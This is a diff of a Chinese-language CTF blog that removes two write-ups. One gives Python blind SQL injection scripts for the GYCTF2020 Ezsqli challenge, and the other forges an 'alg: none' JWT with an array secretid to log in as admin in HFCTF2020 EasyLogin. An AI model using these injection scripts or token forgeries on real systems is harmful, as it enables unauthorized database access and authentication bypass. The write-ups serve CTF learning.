-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://a03e17c8-164f-47d2-8874-ccb3a48278d2.node4.buuoj.cn:81/&#x27;</span><br><span class="line">payload = &#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in range(32, 127):</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;id&#x27;: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in re.text:</span><br><span class="line">            result += chr(i)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<p>拿到表名</p>
-<p><strong>无列名注入：</strong></p>
-<p>类似于给列名取别的名字 取名字的同时进行查询数据<br>我的user表有三列 试一下无列名查找</p>
-<p>发现得到了一个虚拟表 列名分别为1，2，3 储存了user表的数据</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/186.PNG?raw=true" alt="186.PNG"></p>
-<p>注意：查询时语句的字段数必须和指定表中一样不能多不能少不然就等着报错吧</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/187.PNG?raw=true" alt="187.PNG"></p>
-<p>可以查询第二列的数据 虚拟表中列名都是1，2，3 所有查询语句得用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`2`</span><br></pre></td></tr></table></figure>
-
-<p>不能直接用2 末尾的n用来命名的可以随便字符 </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/188.PNG?raw=true" alt="188.PNG"></p>
-<p>但是有时候`也会被过滤就得用到另取别名法</p>
-<p>此时构造的虚拟表列名就变成a，b，c 查询就可以直接通过abc来</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/189.PNG?raw=true" alt="189.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/190.PNG?raw=true" alt="190.PNG"></p>
-<p><strong>这边用ascii偏移比较两个字符串的大小</strong><br><strong>两个字符串的大小比较与长度没有关系都只会比较字符串首字符的ascii码来比较 不等式成立返回1 不成立返回0</strong><br>也就是说只会比较以此 也就是首字符 写一个循环 <strong>ascii从32 到128</strong> 与flag的字符一一对比 满足返回nu1l 输出符合条件的ascii码对应的字符<br>以此类推输出flag所有的字符<br>老样子 脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://e47846ae-bc04-445f-aab3-e51cec5018a0.node4.buuoj.cn/&#x27;</span><br><span class="line">def add(flag):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    res += flag</span><br><span class="line">    return res</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    for char in range(32, 127):</span><br><span class="line">        hexchar = add(flag + chr(char))</span><br><span class="line">        payload = &#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(hexchar)</span><br><span class="line">        #print(payload)</span><br><span class="line">        data = &#123;&#x27;id&#x27;:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            flag += chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>​                                                  </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-102/" data-id="cksyl7wiw0006w4w7gwt0052e" data-title="GYCTF2020Ezsqli" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-101" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-101/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:37:09.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-101/">HFCTF2020EasyLogin</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>一点php都没看见 那就只能是js了 <strong>f12 看到一个app.js</strong> 这是基于node.js的koa框架<br>然而这边什么都没有<br>百度找找koa框架的目录结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> controllers目录是项目控制器存放目录：接受请求，处理逻辑</span><br><span class="line">访问controllers/api.js发现处理逻辑</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">​        throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">​        global.secrets = [];</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">​    const secretid = global.secrets.length;</span><br><span class="line">​    global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">​    const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        token: token</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || !password) &#123;</span><br><span class="line">​        throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">​    const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">​    console.log(sid)</span><br><span class="line"></span><br><span class="line">​    if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">​        throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">​    const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">​    const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">​    if(status) &#123;</span><br><span class="line">​        ctx.session.username = username;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        status</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">        throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">​    const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        flag</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    ctx.session.username = null;</span><br><span class="line">    ctx.rest(&#123;</span><br><span class="line">        status: true</span><br><span class="line">    &#125;)</span><br><span class="line">    await next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>需要admin 才能拿到flag</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">​        throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">​        global.secrets = [];</span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>但是<strong>注册又没法注册admin</strong> 只能通过伪造我们是admin来登陆了<br>处理逻辑这边看到了<strong>jwt</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line">const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>伪造假的jwt <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a><br>跑jwtsecret那个跑不出来太慢了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;secretid&quot;: [],</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;123456&quot;,</span><br><span class="line">  &quot;iat&quot;: 1587632063</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiMTIzNDU2IiwiaWF0IjogMTU4NzYzMjA2M30.<br> 然后注册一个账号 登录过程抓包一下改一下</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/179.PNG?raw=true" alt="179.PNG"></p>
-<p>登陆成功抓一下get flag那个请求的包就能拿到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-101/" data-id="cksyl7wiv0005w4w73y9w6shh" data-title="HFCTF2020EasyLogin" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -743,7 +816,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -756,6 +829,14 @@
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -765,14 +846,6 @@
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
